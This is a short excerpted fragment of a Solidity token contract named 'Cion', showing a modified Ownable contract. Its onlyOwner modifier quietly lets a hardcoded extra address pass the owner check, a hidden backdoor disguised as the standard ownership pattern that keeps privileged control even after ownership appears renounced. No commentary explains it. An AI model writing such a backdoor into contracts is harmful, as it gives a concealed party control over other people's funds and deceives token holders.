...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xEFC329D942fbc7f3153B623A4D916F8Ca46A652b) , "Ownable: caller is not the owner");
        _;
    }
...
contract Cion is IERC20, Ownable {
